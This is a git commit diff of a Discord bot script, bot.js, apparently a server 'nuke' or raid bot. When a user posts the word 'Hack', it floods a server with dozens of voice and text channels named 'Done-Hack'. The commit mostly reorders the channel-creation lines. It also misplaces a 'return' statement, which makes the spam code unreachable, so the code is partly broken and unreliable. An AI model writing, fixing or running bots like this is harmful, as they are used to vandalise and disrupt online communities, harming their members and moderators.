551ac6f5b0dceb932c56147eb80b92b1e3abadcd
jnfevsorvnm <40556229+jnfevsorvnm@users.noreply.github.com>
2018-06-27 14:22:11 +0200

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,16 +1,15 @@
 const Discord = require("discord.js");
- 
- const client = new Discord.Client(); var x_x = "Hack"
+ var x_x = "Hack"
+ const client = new Discord.Client(); 
+
   client.on('message', message => {
-   if (message.content === x_x) { if (!message.channel.guild) return; 
+ if (message.content === x_x) {
+return; (!message.channel.guild)   
 
 message.guild.createChannel('Done-Hack', 'voice');  
 message.guild.createChannel('Done-Hack', 'voice');
-message.guild.createChannel('Done-Hack', 'text'); 
-message.guild.createChannel('Done-Hack', 'text');
 message.guild.createChannel('Done-Hack', 'voice'); 
 message.guild.createChannel('Done-Hack', 'voice'); 
-message.guild.createChannel('Done-Hack', 'text');
 message.guild.createChannel('Done-Hack', 'voice'); 
 message.guild.createChannel('Done-Hack', 'voice'); 
 message.guild.createChannel('Done-Hack', 'voice'); 
@@ -21,8 +20,11 @@ message.guild.createChannel('Done-Hack', 'voice');
 message.guild.createChannel('Done-Hack', 'voice'); 
 message.guild.createChannel('Done-Hack', 'voice'); 
 message.guild.createChannel('Done-Hack', 'voice');
-message.guild.createChannel('Done-Hack', 'text');
 message.guild.createChannel('Done-Hack', 'voice');
+message.guild.createChannel('Done-Hack', 'text');
+message.guild.createChannel('Done-Hack', 'text');
+message.guild.createChannel('Done-Hack', 'text');
+message.guild.createChannel('Done-Hack', 'text');
 message.guild.createChannel('Done-Hack', 'text');
 message.guild.createChannel('Done-Hack', 'text');
 message.guild.createChannel('Done-Hack', 'text');
